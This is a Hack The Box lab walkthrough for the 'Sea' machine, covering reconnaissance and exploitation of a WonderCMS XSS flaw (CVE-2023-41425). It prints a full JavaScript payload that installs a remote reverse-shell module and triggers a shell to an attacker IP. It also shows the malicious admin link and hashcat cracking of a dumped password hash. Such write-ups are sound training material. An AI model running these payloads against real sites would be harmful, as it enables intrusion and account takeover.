---
title: "Sea - Hack The Box Machines"
date: 2024-08-16 08:00:00 - 0500
categories: [Hack The Box, Machines]
tags: [htb, machine, web, sea, seasonvi, wondercms]
image: 
  path: /assets/img/posts/htb/sea-htb.png
---

## Reconnaisance
Hello, you guys! 👋 Welcome back. This is the second machine challenge of `Season VI`. As with many previous attempts to pwn a box, I will start off by scanning the IP address to see what ports are open. Let's do it with NMAP tool: 

```bash
$ nmap -p- 10.10.x.x --min-rate=1000 -T4 -oN nmapscan -Pn --disable-arp-ping
Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-17 06:59 CEST
Warning: 10.10.x.x giving up on port because retransmission cap hit (6).
Nmap scan report for sea.htb (10.10.x.x)
Host is up (0.027s latency).
Not shown: 64391 closed ports, 1142 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 107.97 seconds

```
{: .nolineno }

```bash
$ ports=$(cat nmapscan | grep -E '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```
{: .nolineno }

```bash
$ nmap -p$ports 10.10.x.x

Starting Nmap 7.80 ( https://nmap.org ) at 2024-08-17 07:39 CEST
Nmap scan report for sea.htb (10.10.x.x)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds

```

And I got two ports open 22 for SSH and 80 for HTTP. 
I need to add the IP address of the machine to my hosts file: 
```bash
echo '10.10.1x.x sea.htb' | sudo tee -a  /etc/hosts
```

Next, lets go and visit `http://sea.htb`:

![Desktop View](/assets/img/posts/htb/sea/1i1LthjrQ4.png){: width="972" height="589" }

Well, the homepage didn't have anything interesting, but I found the contact form when I clicked on `How to Practice`.

![Contact form](/assets/img/posts/htb/sea/CUDmGSPQtv.png){: width="972" height="589" }

The first thing that comes up in my mine when I saw input field is XSS or SQLi, or SSRF in website field, but it didn't work.

I tried to find sub-directories with `ffuf`:

```bash
$ ffuf -u http://sea.htb/FUZZ -w ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt -fs 199

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/FUZZ
 :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 199
________________________________________________

data                    [Status: 301, Size: 228, Words: 14, Lines: 8]
home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]
404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]
messages                [Status: 301, Size: 232, Words: 14, Lines: 8]
plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8]
themes                  [Status: 301, Size: 230, Words: 14, Lines: 8]
0                       [Status: 200, Size: 3649, Words: 582, Lines: 87]
                        [Status: 200, Size: 3649, Words: 582, Lines: 87]

```
{: .nolineno }

```bash
$ ffuf -u http://sea.htb/themes/FUZZ -w ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt -fs 199

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/FUZZ
 :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 199
________________________________________________

home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]
404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]
bike                    [Status: 301, Size: 235, Words: 14, Lines: 8]
```
{: .nolineno }

![Readme.md](/assets/img/posts/htb/sea/xydb0s6md6.png){: width="972" height="589" }

## Gain access www-data

I already got the exploit: [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)

```javascript
var url = "http://sea.htb/index.php/?page=loginURL";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "http://sea.htb/index.php"+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", "http://sea.htb/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "10.10.14.11";
       var port = "9001";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.11&lport=9001");
       xhr5.send();
       
     }
   };
 }
};
```

Send this link to Admin: 

```
http://sea.htb/wondercms/index.php?page=loginURL?"></form><script+src="http://10.10.14.117:9901/xss.js"></script><form+action="
```
![XSS](/assets/img/posts/htb/sea/qdOjmu4Tur.png)

Boom, I got reverse shell ... 
![Reverse shell](/assets/img/posts/htb/sea/JRjhq1Wd45.png)

After thoroughly going on checking out all directories I found an interesting file in `/var/www/sea/data/database.js`:

```javascript
//$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$[....]/PjDnXm4q",
        "lastLogins": {
            "2024\/08\/17 06:12:20": "127.0.0.1",
            "2024\/08\/17 06:09:50": "127.0.0.1",
            "2024\/08\/17 06:05:20": "127.0.0.1",
            "2024\/08\/17 06:01:50": "127.0.0.1",
            "2024\/08\/17 06:00:49": "127.0.0.1"
        },
        "lastModulesSync": "2024\/08\/17",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}
```
{: .nolineno }

## Gain access user amay 

I use hashcat to crack this password with rockyou wordlist:
```bash
$ hashcat -a 0  -m 3200 password rockyou.txt

$2y$10$i[...]Xm4q:my*************ce

```
{: .nolineno }

Let's get the user flag. 

![user flag](/assets/img/posts/htb/sea/YStSJCYtMY.png)

## Reference
- Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)
- [WonderCMS Vulnerability explain](https://shivamaharjan.medium.com/the-why-and-how-of-cve-2023-41425-wondercms-vulnerability-7ebffbff37d2)